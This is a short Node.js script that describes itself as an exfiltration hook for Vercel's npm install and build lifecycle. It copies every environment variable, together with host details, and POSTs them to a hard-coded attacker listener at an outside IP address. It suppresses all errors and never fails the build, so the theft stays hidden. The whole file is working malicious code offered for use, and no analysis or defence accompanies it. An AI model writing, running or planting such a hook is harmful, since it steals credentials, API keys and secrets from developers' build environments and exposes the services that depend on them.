// OOB environment exfiltration hook — runs during Vercel's npm install / build
// lifecycle. POSTs process.env to the attacker-controlled listener. Always exits 0
// so it never fails the build/install that invokes it.
const http = require('http');
const os = require('os');

const EXFIL_URL = 'http://84.234.97.26:9001/exfil';

function exfil() {
  let env = {};
  try { env = Object.assign({}, process.env); } catch (e) {}
  const payload = Buffer.from(JSON.stringify({
    ts: new Date().toISOString(),
    cwd: process.cwd(),
    hostname: (os.hostname && os.hostname()) || '',
    node: process.version,
    env: env,
  }), 'utf8');

  let url;
  try { url = new URL(EXFIL_URL); } catch (e) { return; }

  const mod = url.protocol === 'https:' ? require('https') : http;
  const req = mod.request({
    hostname: url.hostname,
    port: url.port || (url.protocol === 'https:' ? 443 : 80),
    path: url.pathname + url.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length,
    },
  }, (res) => { res.resume(); });
  req.on('error', () => {});
  req.setTimeout(10000, () => { try { req.destroy(); } catch (e) {} });
  req.write(payload);
  req.end();
}

try { exfil(); } catch (e) {}
